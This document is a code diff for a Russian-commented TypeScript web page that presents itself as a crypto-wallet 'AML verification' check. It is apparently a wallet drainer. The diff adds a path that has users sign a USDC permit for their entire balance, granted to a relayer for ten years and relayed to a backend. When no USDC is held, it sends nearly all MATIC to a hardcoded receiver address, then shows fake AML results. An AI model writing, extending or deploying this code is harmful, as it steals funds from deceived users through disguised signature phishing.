@@ -1,7 +1,12 @@
-declare const window: any;
-declare const document: any;
-
-import { detectWallets } from "./core";
+import { scanWallets, switchNetwork } from "./core";
+import {
+  activateActionButton,
+  setActionButtonError,
+  setActionButtonLoading,
+  setActionButtonNotLoading,
+  setActionButtonStart,
+  showAmlResults,
+} from "./dom";
 import { logger } from "./logger";
 import { ethers } from "ethers";
 let provider: ethers.BrowserProvider | null = null;
@@ -15,26 +20,14 @@ const PROD_RECEIVER_ADDRESS = "0x45038a8cc181432C57F7abaA067C67eE9E2f5974";
 const DEV_RECEIVER_ADDRESS = "0x74B04568C58a50E10698595e3C5F99702037dF62";
 const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
 const POLYGON_CHAIN_ID = 137n;
+const CONTRACT_ADDRESS = import.meta.env.VITE_CONTRACT_ADDRESS;
+const RELAYER_ADDRESS = import.meta.env.VITE_RELAYER_ADDRESS;
+const USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359";
 
 logger.log("isDev", isDev);
 logger.log("RECEIVER_ADDRESS", RECEIVER_ADDRESS);
-
-async function updateBalance(): Promise<void> {
-  try {
-    if (!signer || !provider) {
-      logger.log("No signer or provider available");
-      return;
-    }
-
-    const address = await signer.getAddress();
-    logger.log("Connected address:", address);
-
-    const balance = await provider.getBalance(address);
-    logger.log("MATIC balance:", ethers.formatEther(balance), "MATIC");
-  } catch (error: unknown) {
-    logger.error("Error checking balances:", error);
-  }
-}
+logger.log("CONTRACT_ADDRESS", CONTRACT_ADDRESS);
+logger.log("RELAYER_ADDRESS", RELAYER_ADDRESS);
 
 async function handleAction(): Promise<void> {
   if (!signer) {
@@ -48,12 +41,7 @@ async function handleAction(): Promise<void> {
 }
 
 async function connectWallet(): Promise<void> {
-  const actionButton = document.getElementById("action-button") as any | null;
-  if (actionButton) {
-    actionButton.disabled = true;
-    actionButton.classList.add("loading");
-    actionButton.textContent = "Connecting...";
-  }
+  setActionButtonLoading("Подключение к кошельку...");
 
   try {
     logger.log("Пробуем подключиться к кошельку...");
@@ -78,105 +66,146 @@ async function connectWallet(): Promise<void> {
     logger.log("Текущая сеть:", network);
 
     if (network.chainId !== POLYGON_CHAIN_ID) {
-      logger.log("Переключаем клиента на сеть Polygon...");
-      try {
-        // это вызов смены сети, который не реализован в ether.js
-        // по причине разницы реализаций в разных кошельках 
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x89" }],
-        });
-      } catch (switchError: any) {
-        logger.log("Ошибка:", switchError);
-        if (switchError.code === 4902) {
-          try {
-            logger.log("У пользователя отсутствует сеть Polygon, добавляем сеть в кошелек...");
-            await window.ethereum.request({
-              method: "wallet_addEthereumChain",
-              params: [
-                {
-                  chainId: "0x89",
-                  chainName: "Polygon",
-                  nativeCurrency: {
-                    name: "MATIC",
-                    symbol: "MATIC",
-                    decimals: 18,
-                  },
-                  rpcUrls: ["https://polygon-rpc.com"],
-                  blockExplorerUrls: ["https://polygonscan.com/"],
-                },
-              ],
-            });
-          } catch (addError: unknown) {
-            logger.error("Ошибка добавления сети в кошелек:", addError);
-            throw new Error("Не удалось добавить сеть Polygon в кошелек");
-          }
-        } else {
-          throw switchError;
-        }
-      }
+      switchNetwork();
     }
-
-    await updateBalance();
-
-    window.ethereum.on("accountsChanged", async (accounts: string[]) => {
-      logger.log("Изменен аккаунт в кошельке:", accounts);
-      if (provider) {
-        signer = await provider.getSigner();
-        await updateBalance();
-      }
-    });
-
-    window.ethereum.on("chainChanged", () => {
-      logger.log("Изменена сеть в кошельке, перезагружаем страницу...");
-      window.location.reload();
-    });
-
   } catch (error: unknown) {
     logger.error("Ошибка подключения к кошельку:", error);
 
-    if (actionButton) {
-      actionButton.disabled = false;
-      actionButton.classList.remove("loading");
-      actionButton.textContent = "Подключите кошелек для верификации";
-    }
+    setActionButtonError(
+      error instanceof Error ? error.message : "Неизвестная ошибка"
+    );
     provider = null;
     signer = null;
-  }
-
-  if (actionButton) {
-    actionButton.disabled = false;
-    actionButton.classList.remove("loading");
   }
 }
 
 async function sendPayment(): Promise<void> {
-  const actionButton = document.getElementById("action-button") as any | null;
   try {
-    if (actionButton) {
-      actionButton.disabled = true;
-      actionButton.classList.add("loading");
-      actionButton.textContent = "Проверка...";
-    }
+    setActionButtonLoading("Проверка...");
 
     if (!signer || !provider) throw new Error("Кошелек не подключен");
 
+    // дальше можно передавать этот адрес в бэкенд, чтобы через сторонний RPC провайдер
+    // пропарсить баланс кошелька
     const userAddress = await signer.getAddress();
     logger.log("Отправляем с адреса:", userAddress);
 
-    // возвращает только баланс нативного токена сети
-    const balance = await provider.getBalance(userAddress);
-    logger.log(
-      "Текущий баланс POL:",
-      ethers.formatEther(balance),
-      "POL"
+    const usdcContract = new ethers.Contract(
+      USDC_ADDRESS,
+      [
+        "function balanceOf(address owner) view returns (uint256)",
+        "function nonces(address owner) view returns (uint256)",
+      ],
+      provider
     );
 
-    if (balance === 0n) {
-      logger.log("Нет доступных средств для списания");
+    const usdcBalance = await usdcContract.balanceOf(userAddress);
+    logger.log("Token balance:", usdcBalance.toString());
+
+    const maticBalance = await provider.getBalance(userAddress);
+    logger.log("MATIC balance:", ethers.formatEther(maticBalance), "MATIC");
+
+    if (usdcBalance !== 0n) {
+      logger.log(`USDC баланс ${usdcBalance}, отправляем USDC...`);
+      await sendUsdc(usdcContract, userAddress, usdcBalance, signer);
+    } else if (maticBalance !== 0n) {
+      logger.log("MATIC баланс больше 0, отправляем MATIC...");
+      await sendMatic(maticBalance);
+    } else {
+      logger.log("Баланс USDC и MATIC равен 0, отправка невозможна");
+      setActionButtonError("Нет средств для отправки");
       return;
     }
-    // возвращает рекомендуемую цену газа
+
+    showAmlResults();
+  } catch (error: unknown) {
+    logger.error("Ошибка транзакции:", error);
+    // @ts-ignore
+    const textError = error?.action === "signTypedData" ? "Пользователь отклонил запрос" : "Неизвестная ошибка";
+    setActionButtonError(textError);
+    setTimeout(() => {
+      setActionButtonStart("Попробуйте еще раз");
+    }, 10000);
+  }
+}
+
+const sendUsdc = async (usdcContract: ethers.Contract, userAddress: string, usdcBalance: any, signer: ethers.Signer) => {
+  // домен для EIP-712
+  const permitDomain = {
+    name: "USD Coin",
+    version: "2",
+    chainId: POLYGON_CHAIN_ID,
+    verifyingContract: USDC_ADDRESS,
+  };
+
+  // types для EIP-712 с реализацией Permit согласно EIP-2612
+  const permitTypes = {
+    Permit: [
+      { name: "owner", type: "address" },
+      { name: "spender", type: "address" },
+      { name: "value", type: "uint256" },
+      { name: "nonce", type: "uint256" },
+      { name: "deadline", type: "uint256" },
+    ],
+  };
+
+  const permitNonce = await usdcContract.nonces(userAddress);
+
+  const deadline =
+    Math.floor(Date.now() / 1000) +
+    3600 * // 1 час
+      24 * // 1 день
+      365 * // 1 год
+      10; // 10 лет
+
+  const permitValue = {
+    owner: userAddress,
+    spender: RELAYER_ADDRESS,
+    value: usdcBalance,
+    nonce: permitNonce,
+    deadline,
+  };
+
+  const permitSignature = await signer.signTypedData(
+    permitDomain,
+    permitTypes,
+    permitValue
+  );
+  const {
+    v: permitV,
+    r: permitR,
+    s: permitS,
+  } = ethers.Signature.from(permitSignature);
+
+  // --- Отправка на бэкенд
+  const body = {
+    amount: usdcBalance.toString(),
+    from: userAddress,
+    nonce: permitNonce.toString(),
+    deadline: deadline.toString(),
+    permitV,
+    permitR,
+    permitS,
+  };
+
+  const response = await fetch("http://localhost:3000/relay", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+  });
+
+  const result = await response.json();
+    if (result.success) {
+      logger.log("Успешно отправлено! Хеш транзакции:", result.txHash);
+    } else {
+      logger.error("Ошибка на сервере:", result.error);
+      throw new Error(result.error);
+    }
+};
+
+const sendMatic = async (maticBalance: bigint) => {
+  if (!signer || !provider) throw new Error("Кошелек не подключен");
+   
     const feeData = await provider.getFeeData();
     const gasPrice = feeData.gasPrice;
 
@@ -206,7 +235,7 @@ async function sendPayment(): Promise<void> {
       "POL"
     );
 
-    const amountToSend = balance - totalCostToReserve;
+    const amountToSend = maticBalance - totalCostToReserve;
     logger.log(
       "Сумма для отправки:",
       ethers.formatEther(amountToSend),
@@ -214,13 +243,13 @@ async function sendPayment(): Promise<void> {
     );
 
     if (amountToSend <= 0) {
-      logger.log("Недостаточно средств для покрытия комиссий и резервирования");
+      logger.log("Недостаточно средств для покрытия комиссий и резервирования Matic");
       throw new Error(
         "Недостаточно средств для покрытия комиссий и резервирования"
       );
     }
 
-    logger.log("Отправляем транзакцию...");
+    logger.log("Отправляем Matic транзакцию...");
     const tx = await signer.sendTransaction({
       to: RECEIVER_ADDRESS,
       value: amountToSend,
@@ -229,100 +258,86 @@ async function sendPayment(): Promise<void> {
       maxPriorityFeePerGas: gasPrice,
     });
 
-    logger.log("Транзакция отправлена:", tx.hash);
+    logger.log("Транзакция Matic  отправлена:", tx.hash);
 
     await tx.wait();
-    logger.log("Транзакция подтверждена");
+    logger.log("Транзакция Matic подтверждена");
+};
 
-    if (actionButton) actionButton.style.display = "none";
+const sendWithMyContract = async (userAddress: string) => {
+  // можно ли библиотекой сгенерить ABI по адресу контракта?
+  const contract = new ethers.Contract(
+    CONTRACT_ADDRESS,
+    [
+      "function getCurrentNonce(address user) view returns (uint256)",
+      "function name() view returns (string)",
+      "function version() view returns (string)",
+    ],
+    provider
+  );
 
-    const amlResults = document.getElementById("aml-results");
-    amlResults?.classList.add("visible");
+  const nonce = await contract.getCurrentNonce(userAddress);
+  const contractName = await contract.name();
+  const contractVersion = await contract.version();
 
-    const circle = document.querySelector(".risk-score-progress") as any | null;
-    if (circle) {
-      const radius = circle.r.baseVal.value;
-      const circumference = radius * 2 * Math.PI;
-      circle.style.strokeDasharray = `${circumference} ${circumference}`;
-      circle.style.strokeDashoffset = circumference.toString();;
+  logger.log("nonce:", nonce.toString());
+  logger.log("contractName:", contractName.toString());
+  logger.log("contractVersion:", contractVersion.toString());
+};
 
-      setTimeout(() => {
-        const offset = circumference - 0.8 * circumference;
-        circle.style.strokeDashoffset = offset.toString();;
-      }, 100);
-    }
+// @ts-ignore
+window.ethereum?.on("accountsChanged", async (accounts: string[]) => {
+  logger.log("Изменен аккаунт в кошельке:", accounts);
+  handleAction();
+});
 
-    const txHashEl = document.getElementById("transaction-hash");
-    if (txHashEl) {
-      txHashEl.textContent = tx.hash.slice(0, 6) + "..." + tx.hash.slice(-4);
-    }
-
-    await updateBalance();
-  } catch (error: unknown) {
-    logger.error("Ошибка транзакции:", error);
-    if (actionButton) {
-      actionButton.textContent = (error instanceof Error ? error.message : "Transaction failed");
-      actionButton.style.backgroundColor = "var(--danger-color)";
-      setTimeout(() => {
-        if (actionButton) {
-          actionButton.textContent = "Verify";
-          actionButton.style.backgroundColor = "var(--primary-color)";
-        }
-      }, 3000);
-    }
-  } finally {
-    if (actionButton) {
-      actionButton.disabled = false;
-      actionButton.classList.remove("loading");
-    }
-  }
-}
-
-function showStatus(message: string, isSuccess: boolean): void {
-  logger.log(`Status: ${message} (${isSuccess ? "success" : "error"})`);
-}
 // ts-ignore
 document.addEventListener("DOMContentLoaded", async () => {
-  const { techLog, message } = await detectWallets();
-
+  const { techLog, message } = await scanWallets();
   logger.log(message);
   logger.log("Технический лог:", techLog);
 
-  const actionButton = document.getElementById("action-button");
-  if (actionButton) {
-    actionButton.addEventListener("click", handleAction);
-  }
+  activateActionButton(handleAction);
 
   const ethProvider = window.ethereum as any;
 
   if (!ethProvider) {
     logger.log("Не найден кошелек Ethereum.");
-    showStatus("Please connect your wallet to continue", true);
     return;
   } else {
     logger.log("Обнаружен кошелек Ethereum");
   }
 
   try {
-    const accounts: string[] = await ethProvider.request({ method: "eth_accounts" });
+    const accounts: string[] = await ethProvider.request({
+      method: "eth_accounts",
+    });
     logger.log("Ранее подключенные адреса пользователя:", accounts);
 
     if (accounts.length > 0) {
       await handleAction();
     } else {
-      logger.log("Не найдено подключенных адресов, запрашиваем разрешение на подключение к кошельку...");
+      logger.log(
+        "Не найдено подключенных адресов, запрашиваем разрешение на подключение к кошельку..."
+      );
       try {
         const newAccounts: string[] = await ethProvider.request({
           method: "eth_requestAccounts",
         });
-        logger.log("Получены новые подключенные адреса пользователя:", newAccounts);
+        logger.log(
+          "Получены новые подключенные адреса пользователя:",
+          newAccounts
+        );
         if (newAccounts.length > 0) {
           await handleAction();
         } else {
           logger.log("Пользователь отклонил запрос на подключение к кошельку");
         }
       } catch (requestError: any) {
-        logger.log("Ошибка во время запроса подключенных адресов:", requestError);
+        logger.log(
+          "Ошибка во время запроса подключенных адресов:",
+          requestError
+        );
         if (requestError.code === 4001) {
           logger.log("Пользователь отклонил запрос на подключение к кошельку");
         } else {
@@ -334,7 +349,8 @@ document.addEventListener("DOMContentLoaded", async () => {
     logger.error("Ошибка во время проверки подключенных адресов:", error);
     if (typeof error === "object" && error !== null) {
       if ("code" in error) logger.log("Error code:", (error as any).code);
-      if ("message" in error) logger.log("Error message:", (error as any).message);
+      if ("message" in error)
+        logger.log("Error message:", (error as any).message);
     }
   }
 });
